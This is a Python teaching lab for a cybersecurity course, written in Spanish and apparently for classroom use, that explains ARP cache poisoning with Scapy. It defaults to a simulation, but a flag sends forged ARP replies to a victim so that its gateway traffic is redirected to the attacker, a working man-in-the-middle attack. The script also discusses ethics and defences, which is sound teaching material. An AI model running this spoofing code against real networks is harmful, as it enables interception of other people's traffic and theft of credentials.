"""
================================================================================
LABORATORIO 02 — ARP Spoofing con Scapy (entorno controlado)
Curso: CY-302 Programación Avanzada | Clase 11
================================================================================

OBJETIVO DIDÁCTICO
------------------
Explicar qué es ARP, cómo funciona el envenenamiento de la caché ARP
(ARP spoofing / ARP poisoning) y qué implica a nivel ético y de seguridad.
El ejemplo de la diapositiva se reproduce aquí de forma COMPLETA y SEGURA
para el aula:

  - Por defecto corre en modo SIMULACIÓN (no envía paquetes).
  - El envío real exige --confirmar-lab y un entorno aislado del aula/VM.

CONCEPTO (en una frase)
-----------------------
ARP asocia IP ↔ MAC en una LAN. Si un atacante envía respuestas ARP falsas
(op=2 is-at), puede hacerse pasar por el gateway y redirigir tráfico (MITM).

Ética
-----
ARP spoofing sin autorización es un ataque. Este laboratorio SOLO debe
usarse en redes propias o VMs del aula, con consentimiento del instructor.

USO
---
    python 02_arp_spoofing.py                         # simulación didáctica
    python 02_arp_spoofing.py --mostrar-paquete
    python 02_arp_spoofing.py --objetivo 192.168.56.10 --spoof 192.168.56.1 \\
        --confirmar-lab --segundos 10                 # SOLO red de laboratorio
================================================================================
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import Optional


try:
    from scapy.all import ARP, Ether, srp, send, conf  # type: ignore
except ImportError:
    print("[ERROR] Scapy no está instalado. Ejecute: pip install scapy")
    sys.exit(1)

conf.verb = 0


# =============================================================================
# TEORÍA — para proyectar / explicar en clase
# =============================================================================
def explicar_arp_y_spoofing() -> None:
    print(
        """
╔══════════════════════════════════════════════════════════════════════════════╗
║  ARP SPOOFING — ¿QUÉ ESTÁ PASANDO EN LA RED?                                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  1. ARP (Address Resolution Protocol)                                        ║
║     Pregunta:  "¿Quién tiene la IP 192.168.1.1?"  → ARP who-has (op=1)        ║
║     Respuesta: "Soy yo, MAC aa:bb:cc:dd:ee:ff" → ARP is-at   (op=2)          ║
║                                                                              ║
║  2. Cada host guarda una tabla ARP (caché): IP → MAC                         ║
║                                                                              ║
║  3. ARP Spoofing (ataque):                                                   ║
║     El atacante envía un ARP is-at FALSO diciendo:                           ║
║       "La IP del gateway (spoof_ip) es MI dirección MAC"                     ║
║     La víctima actualiza su caché y envía el tráfico al atacante.            ║
║                                                                              ║
║  4. Consecuencia típica: Man-in-the-Middle (MITM) entre víctima y gateway.   ║
║                                                                              ║
║  Diagrama:                                                                   ║
║                                                                              ║
║      [Víctima] ----(piensa que----> [Atacante] ----> [Gateway / Router]      ║
║                   el atacante es                     (IP spoof_ip)           ║
║                   el gateway)                                                ║
║                                                                              ║
║  Campos clave del paquete falso (como en la diapositiva):                    ║
║      ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)              ║
║         op=2     → respuesta (is-at), no pregunta                            ║
║         pdst     → IP de la víctima                                          ║
║         psrc     → IP que se está suplanto (p.ej. el gateway)                ║
║         hwdst    → MAC de la víctima                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    )


# =============================================================================
# FUNCIONES DEL LABORATORIO
# =============================================================================
def get_mac(ip: str, timeout: float = 2.0) -> Optional[str]:
    """
    Resuelve la MAC de una IP mediante ARP who-has (srp = send/receive L2).

    Equivale al get_mac() de la diapositiva, pero con manejo de errores
    y mensajes claros para el estudiante.
    """
    print(f"\n[get_mac] Preguntando en la LAN: ¿quién tiene {ip}?")
    solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    print(f"  Paquete: {solicitud.summary()}")

    respondidos, _ = srp(solicitud, timeout=timeout, retry=1)
    if not respondidos:
        print(f"  → No hubo respuesta ARP para {ip}")
        return None

    mac = respondidos[0][1].hwsrc
    print(f"  → {ip} responde con MAC {mac}")
    return mac


def construir_paquete_falso(
    target_ip: str,
    spoof_ip: str,
    target_mac: str,
) -> ARP:
    """
    Construye el ARP is-at falso exactamente como en la diapositiva:

        packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)

    En la simulación NO se envía; solo se inspecciona.
    """
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    return packet


def mostrar_paquete(packet: ARP) -> None:
    """Imprime el paquete campo a campo para explicación en pizarra/proyector."""
    print("\n[PAQUETE ARP FALSO — inspección didáctica]")
    print(f"  summary : {packet.summary()}")
    print(f"  op      : {packet.op}  (2 = is-at / respuesta)")
    print(f"  psrc    : {packet.psrc}  ← IP que SE SUPLANTA (spoof_ip)")
    print(f"  hwsrc   : {packet.hwsrc}  ← MAC del ATACANTE (rellenada por Scapy)")
    print(f"  pdst    : {packet.pdst}  ← IP de la VÍCTIMA")
    print(f"  hwdst   : {packet.hwdst}  ← MAC de la VÍCTIMA")
    print("\n  Interpretación para la víctima:")
    print(
        f'  "La IP {packet.psrc} ahora está en la MAC {packet.hwsrc}" '
        "(¡mentira controlada del laboratorio!)"
    )
    packet.show()


def arp_spoof_simulado(target_ip: str, spoof_ip: str, target_mac: str = "aa:bb:cc:dd:ee:ff") -> None:
    """
    Versión SEGURA para el aula: construye y explica el paquete sin enviarlo.
    No requiere red real ni privilegios de administrador.
    """
    print("\n=== MODO SIMULACIÓN (no se envía nada a la red) ===")
    packet = construir_paquete_falso(target_ip, spoof_ip, target_mac)
    mostrar_paquete(packet)
    print(
        "\nEn la diapositiva el envío sería:\n"
        "  srp(Ether(dst=target_mac)/packet, verbose=0)\n"
        "Aquí NO se ejecuta ese envío. Use --confirmar-lab solo en VM de aula."
    )


def restaurar_arp(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str) -> None:
    """
    Buena práctica ética: al terminar, reenviar ARP correctos para restaurar
    la caché de la víctima (evita dejar la red degradada).
    """
    print("\n[Restauración] Enviando ARP legítimos para limpiar la caché...")
    send(
        ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac),
        count=3,
        verbose=0,
    )
    send(
        ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac),
        count=3,
        verbose=0,
    )
    print("  Caché ARP restaurada (intento).")


def arp_spoof_laboratorio(
    target_ip: str,
    spoof_ip: str,
    segundos: int = 10,
    intervalo: float = 2.0,
) -> None:
    """
    Envío REAL del ataque — SOLO con --confirmar-lab en red aislada.

    Reproduce la función de la diapositiva y añade:
      - resolución de MAC
      - bucle corto temporal
      - restauración al salir
    """
    print("\n=== MODO LABORATORIO REAL (paquetes ARP se enviarán) ===")
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[ERROR] No se pudo obtener la MAC del objetivo. Abortando.")
        return

    gateway_mac = get_mac(spoof_ip)
    packet = construir_paquete_falso(target_ip, spoof_ip, target_mac)
    mostrar_paquete(packet)

    print(f"\nEnviando respuestas ARP falsas durante ~{segundos}s (Ctrl+C para parar)...")
    inicio = time.time()
    try:
        while time.time() - inicio < segundos:
            # Equivalente didáctico al srp(Ether(...)/packet) de la PPT
            send(packet, verbose=0)
            print(f"  → enviado: {spoof_ip} is-at {packet.hwsrc}  →  {target_ip}")
            time.sleep(intervalo)
    except KeyboardInterrupt:
        print("\nInterrumpido por el usuario.")
    finally:
        if gateway_mac:
            restaurar_arp(target_ip, spoof_ip, target_mac, gateway_mac)
        else:
            print("[AVISO] No se pudo restaurar ARP (MAC del gateway desconocida).")


def discusion_etica() -> None:
    print(
        """
╔══════════════════════════════════════════════════════════════════════════════╗
║  REFLEXIÓN ÉTICA (punto 3 de la práctica de la clase)                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  • ARP spoofing intercepta tráfico ajeno: viola confidencialidad.            ║
║  • En producción puede usarse maliciosamente (robo de credenciales, etc.).   ║
║  • Defensas: ARP estático, Dynamic ARP Inspection (DAI), segmentación,       ║
║    cifrado extremo a extremo (HTTPS/VPN) para reducir el impacto.            ║
║  • En ciberseguridad ofensiva SOLO se practica con autorización escrita.     ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    )


# =============================================================================
# CLI
# =============================================================================
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Laboratorio controlado de ARP spoofing (CY-302)"
    )
    parser.add_argument(
        "--objetivo",
        default="192.168.1.2",
        help="IP de la víctima de laboratorio (default diapositiva: 192.168.1.2)",
    )
    parser.add_argument(
        "--spoof",
        default="192.168.1.1",
        help="IP a suplantar, normalmente el gateway (default: 192.168.1.1)",
    )
    parser.add_argument(
        "--mostrar-paquete",
        action="store_true",
        help="Fuerza la impresión detallada del paquete ARP falso",
    )
    parser.add_argument(
        "--confirmar-lab",
        action="store_true",
        help="PERMITE envío real. Úselo SOLO en VM/red aislada del aula.",
    )
    parser.add_argument(
        "--segundos",
        type=int,
        default=10,
        help="Duración máxima del spoofing real (default: 10)",
    )
    args = parser.parse_args()

    explicar_arp_y_spoofing()

    if not args.confirmar_lab:
        # MAC ficticia solo para visualizar el paquete en clase
        arp_spoof_simulado(args.objetivo, args.spoof)
        if args.mostrar_paquete:
            pass  # ya se mostró en simulación
        discusion_etica()
        print(
            "\nPara el envío real en VM de laboratorio:\n"
            f"  python 02_arp_spoofing.py --objetivo {args.objetivo} "
            f"--spoof {args.spoof} --confirmar-lab --segundos 10\n"
        )
        return

    print(
        "\n⚠  MODO REAL ACTIVADO (--confirmar-lab).\n"
        "   Asegúrese de estar en una red de laboratorio autorizada.\n"
    )
    arp_spoof_laboratorio(args.objetivo, args.spoof, segundos=args.segundos)
    discusion_etica()


if __name__ == "__main__":
    main()
